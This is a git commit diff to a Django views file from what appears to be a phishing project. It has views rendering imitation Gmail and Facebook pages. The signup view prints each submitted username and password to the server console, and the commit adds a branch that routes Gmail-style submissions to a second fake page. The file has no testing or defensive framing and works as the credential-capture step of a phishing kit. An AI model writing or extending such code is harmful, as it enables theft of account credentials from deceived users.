c5dc3d8bc17ee28ff06938e86b0ead637b336ceb
babucarr32 <baboucarry@gmail.com>
2023-02-05 13:01:21 +0000

    Formatted the code

--- Sites/views.py
+++ Sites/views.py
@@ -8,10 +8,15 @@ def gmail(request):
     return render(request, 'gmail.html')
 
 def signup(request):
-    if request.method == 'POST': #User has info and wants an an account
-        print("-"*62)
-        print("|"+ " "*10+"Username"+ " "*12+ "  |" + " "*8+"Password"+ " "*11 + "|")
-        print("-"*62)
-        print("|       " + request.POST['username'] + "     |       " + request.POST['password']+ "          |")
-        print("-"*62)
-        return render(request, 'facebook.html')
+    try:
+        if request.POST['gmailUsername']:
+            print("This is from gmail")
+            return render(request, 'gmail2.html')
+    except: 
+        if request.method == 'POST': #User has info and wants an an account
+            print("-"*62)
+            print("|"+ " "*10+"Username"+ " "*12+ "  |" + " "*8+"Password"+ " "*11 + "|")
+            print("-"*62)
+            print("|       " + request.POST['username'] + "     |       " + request.POST['password']+ "          |")
+            print("-"*62)
+            return render(request, 'facebook.html')
